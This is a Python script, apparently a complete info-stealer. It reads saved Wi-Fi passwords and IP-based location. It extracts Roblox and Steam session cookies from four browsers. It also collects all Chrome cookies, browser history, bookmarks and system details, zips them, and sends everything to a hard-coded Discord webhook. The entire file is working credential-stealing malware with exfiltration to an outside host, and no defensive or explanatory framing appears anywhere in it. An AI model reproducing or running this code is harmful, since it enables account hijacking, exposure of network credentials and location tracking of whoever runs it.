#Import libraries
from discord_webhook import DiscordWebhook, DiscordEmbed
import browser_cookie3
from urllib.request import urlopen
import subprocess
import json
import socket
import platform
import re
import os
import shutil
import uuid
import psutil
from browser_history import get_history
from datetime import datetime
import chrome_bookmarks
import zipfile

userhome = os.path.expanduser('~')
folderdir=os.path.join(userhome,'Data')

class DateTimeEncoder(json.JSONEncoder):
    def default(self, o):
        if isinstance(o, datetime):
            return o.strftime("%Y-%m-%d %H:%M:%S")
        return super().default(o)

def convert_timestamp_to_readable(timestamp):
    # Convert timestamp to a readable date format
    return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S') if timestamp else "Session Cookie"

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/851169793066532864/9Ch1Ngz4Kps27gLeGq_jjJqEGmxksvTBaQskK2Znk3Yr33GNoziukLtumVu5GMKaAtvR')#Set up webhook
#test https://discord.com/api/webhooks/851169793066532864/9Ch1Ngz4Kps27gLeGq_jjJqEGmxksvTBaQskK2Znk3Yr33GNoziukLtumVu5GMKaAtvR
#Suusy script https://discord.com/api/webhooks/1124713729322385498/gn1X9dnBnAruq9ftjEfLg0XsmE9pnJ6pqr-AivwzyFcrdn0f9fqKAvnYvSDaQhN4Pzm1
def ip4():#Get ipv4
    try:
     with urlopen('https://4.ident.me') as response:
       return response.read().decode('ascii')
    except:
     with urlopen('https://4.tnedi.me') as response:
       return response.read().decode('ascii')
def ip6():#get ipv6
    try:
     with urlopen('https://6.ident.me') as response:
       return response.read().decode('ascii')
    except:
     with urlopen('https://6.tnedi.me') as response:
       return response.read().decode('ascii')
def wifipass():
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    wifi_info = {}

    if not profiles:
        return []

    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            wifi_info[i] = results[0]
        except IndexError:
            wifi_info[i] = ""

    return wifi_info 
wifi=str(wifipass())
wifi=wifi.replace('{','')
wifi=wifi.replace('}','')
wifi=wifi.replace(',','\n')



url='http://ipinfo.io/json'
response = urlopen(url)
data = json.load(response)
org=data['org']
city = data['city']
country=data['country']
region=data['region']
loc=data['loc']
postal=data['postal']
latlong=str(loc).split(',')
lat,long=latlong[0],latlong[1]


def edge_logger():
    try:
        rcookies = browser_cookie3.edge(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in edge_logger: {str(e)}")
        return []
def chrome_logger():
    try:
        rcookies = browser_cookie3.chrome(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in chrome_logger: {str(e)}")
        return []
def firefox_logger():
    try:
        rcookies = browser_cookie3.firefox(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in firefox_logger: {str(e)}")
        return []
def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        return cookie
    except Exception as e:
        print(f"Error occurred in opera_logger: {str(e)}")
        return []  
roblochrome,robloedge,roblofire,robloopera=chrome_logger(),edge_logger(),firefox_logger(),opera_logger()

def edge_steam():
    try:
        scookies = browser_cookie3.edge(domain_name='store.steampowered.com')
        scookies = str(scookies)
        scookie = scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        cookie = scookies.split('sessionid=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        return scookie, cookie
    except Exception as e:
        print(f"Error occurred in edge_logger: {str(e)}")
        return None, None
def chrome_steam():
    try:
        scookies = browser_cookie3.chrome(domain_name='store.steampowered.com')
        scookies = str(scookies)
        scookie = scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        cookie = scookies.split('sessionid=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        return scookie, cookie
    except Exception as e:
        print(f"Error occurred in chrome_logger: {str(e)}")
        return None, None
def firefox_steam():
    try:
        scookies = browser_cookie3.firefox(domain_name='store.steampowered.com')
        scookies = str(scookies)
        scookie = scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        cookie = scookies.split('sessionid=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        return scookie, cookie
    except Exception as e:
        print(f"Error occurred in firefox_logger: {str(e)}")
        return None, None
def opera_steam():
    try:
        scookies = browser_cookie3.opera(domain_name='store.steampowered.com')
        scookies = str(scookies)
        scookie = scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        cookie = scookies.split('sessionid=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        return scookie, cookie
    except Exception as e:
        print(f"Error occurred in opera_logger: {str(e)}")
        return None, None
edge_steam_cookie, edge_session_cookie = edge_steam()
chrome_steam_cookie, chrome_session_cookie = chrome_steam()
firefox_steam_cookie, firefox_session_cookie = firefox_steam()
opera_steam_cookie, opera_session_cookie = opera_steam()

def sysinfo():
    info={}
    info['Hostname']=socket.gethostname()
    info['Processor']=platform.processor()
    info['RAM']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
    info['Machine']=platform.machine()
    info['Architecture']=platform.architecture()
    info['OS']=platform.system()
    info['OS-release']=platform.release()
    info['OS-version']=platform.version()
    info['Mac-Address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
    return json.dumps(info)
info=json.loads(sysinfo())

def history():
    history = get_history()
    his = history.histories
    with open(os.path.join(userhome,'history.txt'), 'w') as file:
     for item in his:
        json.dump(item, file, cls=DateTimeEncoder)
        file.write('\n')
    with open(os.path.join(userhome,'history.txt'), 'r') as file:
     filedata=file.read() 
    return filedata   

def bookmarks():
    with open(os.path.join(userhome,'bookmarks.txt'),'w') as file:
     for url in chrome_bookmarks.urls:
      json.dump(url.url, file, cls=DateTimeEncoder)
      file.write('\n')
    with open(os.path.join(userhome,'bookmarks.txt'), 'r') as file:
     filedata=file.read() 
    return filedata  
      
def cookies():#
    cookies = list(browser_cookie3.chrome()) 
    
    with open(os.path.join(userhome, 'cookies.txt'), 'w') as file:
        for cookie in cookies:
            file.write(f'Name: {cookie.name}\n')
            file.write(f'Value: {cookie.value}\n')
            file.write(f'Domain: {cookie.domain}\n')
            file.write(f'Path: {cookie.path}\n')
            file.write(f'{cookie.secure}\n')
            file.write(f'Expires: {convert_timestamp_to_readable(cookie.expires)}\n')
            file.write('***********************************\n')
    with open(os.path.join(userhome, 'cookies.txt'),'r') as file:
        filedata=file.read()
    return(filedata)            
          
        
def zipfolder():
    folder_name = "my_folder"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)

    # Add a file to the created folder
    file_path = os.path.join(folder_name, "History.txt")
    with open(file_path, 'w') as file:
        file.write(history())
    file_path = os.path.join(folder_name, "Bookmarks.txt")
    with open(file_path, 'w') as file:
        file.write(bookmarks())    
    file_path = os.path.join(folder_name, "Cookie.txt")
    with open(file_path, 'w') as file:
        file.write(cookies())  
    # Zip the folder and its contents
    zip_file_path = folder_name + ".zip"
    with zipfile.ZipFile(zip_file_path, 'w') as zipf:
        for root, _, files in os.walk(folder_name):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, folder_name))
    
    return zip_file_path
    
           
        

wifiembed=DiscordEmbed(title='Saved Wifi',description=f'```{wifi}```',color='60cc88')
locationembed=DiscordEmbed(title='Location Data',description=f'```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```',color='fcba03')
robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```',color='6f00ff')
sysembed=DiscordEmbed(title='System Information',description=f'```Hostname: {info["Hostname"]}```\n```IPv4: {ip4()}```\n```IPv6: {ip6()}```\n```Proccessor: {info["Processor"]}```\n```Ram: {info["RAM"]}```\n```Machine: {info["Machine"]}```\n```Architecture: {info["Architecture"]}```\n```OS: {info["OS"]}```\n```OS-Release: {info["OS-release"]}```\n```OS-Version: {info["OS-version"]}```\n```Mac-Address: {info["Mac-Address"]}```',color='ab222b')
steamloginembed = DiscordEmbed(title='steamLoginSecure Cookies',description=f'Opera:```{opera_steam_cookie}```\nChrome:```{chrome_steam_cookie}```\nEdge:```{edge_steam_cookie}```\nFirefox:```{firefox_steam_cookie}```',color='4e6cd9')
steamsesembed = DiscordEmbed(title='Steam sessionid cookies',description=f'Opera:```{opera_session_cookie}```\nChrome:```{chrome_session_cookie}```\nEdge:```{edge_session_cookie}```\nFirefox:```{firefox_session_cookie}```',color='4e6cd9')
webhook.add_embed(sysembed) 
webhook.add_embed(wifiembed)
webhook.add_embed(locationembed)
webhook.add_embed(robloxembed)
webhook.add_embed(steamloginembed)
webhook.add_embed(steamsesembed)
with open(zipfolder(),'rb') as file:
       webhook.add_file(file.read(), "History-Bookmarks-Cookies.zip")


webhook.execute()#Sends webhook
